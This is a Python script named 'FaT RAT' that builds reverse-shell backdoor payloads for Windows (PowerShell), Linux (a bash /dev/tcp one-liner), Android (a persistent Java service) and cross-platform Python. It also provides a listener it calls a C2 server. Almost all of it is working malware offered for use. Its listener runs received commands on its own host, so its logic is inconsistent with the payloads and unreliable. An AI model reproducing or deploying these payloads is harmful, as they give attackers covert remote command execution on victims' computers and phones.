#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
FaT RAT - Advanced Remote Access Tool
Highly penetrating multi-platform RAT
"""

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress
import socket
import threading
import subprocess
import base64
import os

console = Console()

class FatRAT:
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 4444
        
    def generate_payload(self, platform):
        """Generate payload for specified platform"""
        console.print(Panel.fit(
            f"[bold red]FaT RAT - {platform.upper()} Payload Generator[/bold red]",
            border_style="red"
        ))
        
        payloads = {
            'windows': self.generate_windows_payload,
            'linux': self.generate_linux_payload,
            'android': self.generate_android_payload,
            'cross': self.generate_crossplatform_payload
        }
        
        if platform in payloads:
            payloads[platform]()
        else:
            console.print("[red]Invalid platform[/red]")
    
    def generate_windows_payload(self):
        """Windows payload (PowerShell)"""
        payload = '''$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP",4444)
$stream = $client.GetStream()
$buffer = New-Object byte[] $client.ReceiveBufferSize

while($true) {
    $data = ""
    while($stream.DataAvailable) {
        $read = $stream.Read($buffer, 0, $buffer.Length)
        $data += ([System.Text.Encoding]::ASCII).GetString($buffer, 0, $read)
    }
    
    if($data) {
        $result = Invoke-Expression $data
        $output = $result | Out-String
        $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output)
        $stream.Write($outputBytes, 0, $outputBytes.Length)
    }
    
    Start-Sleep -Milliseconds 500
}'''
        
        output_dir = "fat_rat_payloads"
        os.makedirs(output_dir, exist_ok=True)
        
        with open(os.path.join(output_dir, "windows_payload.ps1"), 'w') as f:
            f.write(payload)
        
        console.print(f"[green]✓ Windows payload created: {output_dir}/windows_payload.ps1[/green]")
        
    def generate_linux_payload(self):
        """Linux/Unix payload (Bash)"""
        payload = '''bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'''
        
        output_dir = "fat_rat_payloads"
        os.makedirs(output_dir, exist_ok=True)
        
        with open(os.path.join(output_dir, "linux_payload.sh"), 'w') as f:
            f.write(payload)
        
        console.print(f"[green]✓ Linux payload created: {output_dir}/linux_payload.sh[/green]")
        
    def generate_android_payload(self):
        """Android payload (Java)"""
        payload = '''public class FatRatBackdoor extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        new Thread(() -> {
            try {
                Socket socket = new Socket("YOUR_IP", 4444);
                BufferedReader in = new BufferedReader(
                    new InputStreamReader(socket.getInputStream()));
                PrintWriter out = new PrintWriter(
                    socket.getOutputStream(), true);
                
                String command;
                while ((command = in.readLine()) != null) {
                    Process process = Runtime.getRuntime().exec(command);
                    BufferedReader reader = new BufferedReader(
                        new InputStreamReader(process.getInputStream()));
                    
                    StringBuilder output = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        output.append(line).append("\\n");
                    }
                    
                    out.println(output.toString());
                    out.flush();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
        
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) { return null; }
}'''
        
        output_dir = "fat_rat_payloads"
        os.makedirs(output_dir, exist_ok=True)
        
        with open(os.path.join(output_dir, "android_payload.java"), 'w') as f:
            f.write(payload)
        
        console.print(f"[green]✓ Android payload created: {output_dir}/android_payload.java[/green]")
        
    def generate_crossplatform_payload(self):
        """Cross-platform Python payload"""
        payload = '''import socket, subprocess, os, sys, platform

host = "YOUR_IP"
port = 4444

def get_shell():
    os_type = platform.system().lower()
    if os_type == 'windows':
        shell = 'cmd.exe'
    else:
        shell = '/bin/bash'
    return shell

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        
        while True:
            command = s.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                break
            
            if command.startswith('cd'):
                try:
                    os.chdir(command[3:].strip())
                except:
                    pass
            
            proc = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )
            
            result = proc.stdout.read() + proc.stderr.read()
            s.send(result)
            
    except Exception as e:
        s.close()
        connect()

if __name__ == '__main__':
    connect()'''
        
        output_dir = "fat_rat_payloads"
        os.makedirs(output_dir, exist_ok=True)
        
        with open(os.path.join(output_dir, "crossplatform_payload.py"), 'w') as f:
            f.write(payload)
        
        console.print(f"[green]✓ Cross-platform payload created: {output_dir}/crossplatform_payload.py[/green]")
    
    def start_listener(self):
        """Start C2 listener"""
        console.print(Panel.fit(
            "[bold cyan]FaT RAT C2 Server[/bold cyan]",
            border_style="cyan"
        ))
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(5)
        
        console.print(f"[green]✓ Listening on {self.host}:{self.port}[/green]")
        console.print("[yellow]Waiting for connections...[/yellow]\n")
        
        try:
            while True:
                client, addr = server.accept()
                console.print(f"[green]✓ Client connected: {addr}[/green]")
                
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except KeyboardInterrupt:
            console.print("\n[yellow]Stopping server...[/yellow]")
    
    def handle_client(self, client, addr):
        """Handle client communication"""
        try:
            while True:
                client.send('shell>>> '.encode())
                command = client.recv(4096).decode()
                
                if command.lower() == 'exit':
                    break
                
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True
                )
                
                output = result.stdout + result.stderr
                if output:
                    client.send(output.encode())
                else:
                    client.send('Command executed\n'.encode())
                    
        except Exception as e:
            console.print(f"[red]Error: {e}[/red]")
        finally:
            client.close()
    
    def run(self):
        """Main interface"""
        console.print(Panel.fit(
            "[bold red]FaT RAT[/bold red]\n"
            "Advanced Multi-Platform Remote Access Tool",
            border_style="red"
        ))
        
        table = Table(title="Generate Payload")
        table.add_column("Platform", style="cyan")
        table.add_column("Description", style="green")
        
        table.add_row("windows", "Windows PowerShell payload")
        table.add_row("linux", "Linux/Unix Bash payload")
        table.add_row("android", "Android Java payload")
        table.add_row("cross", "Cross-platform Python payload")
        
        console.print(table)
        
        choice = input("\n[1] Generate Payload\n[2] Start C2 Server\nChoice: ")
        
        if choice == '1':
            platform = input("Platform (windows/linux/android/cross): ")
            self.generate_payload(platform)
        elif choice == '2':
            self.start_listener()

if __name__ == "__main__":
    rat = FatRAT()
    rat.run()

